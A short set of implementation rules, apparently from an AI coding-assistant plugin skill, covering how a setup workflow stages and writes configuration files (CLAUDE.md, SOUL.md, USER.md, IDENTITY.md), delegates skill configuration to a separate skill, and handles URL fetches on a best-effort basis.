- **CLAUDE.md (or CLAUDE.local.md) is never customised.** Copy verbatim. SOUL.md adjusts tone. USER.md gets the user's headline. IDENTITY.md adjusts role.
- **Stage before write.** Build all content through Steps 2–6. Only Step 7 writes to disk.
- **Step 8 delegates, doesn't duplicate.** When the user opts to configure skills inline, *read* `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow its Section A walks. Don't reimplement key-prompts/MCP-writes/permission-grants here — keep configure-skills as the single source of truth so standalone use and inline use behave identically.
- **No `.claude/skills/` creation in Step 7.** That directory is only needed for custom-authored skills (configure-skills Section B). Sandbox often denies it; let configure-skills create it lazily.
- **URL fetches are best-effort.** Don't loop retries; note failures and move on. Don't ask the user to confirm the synthesised facts — let them edit later.
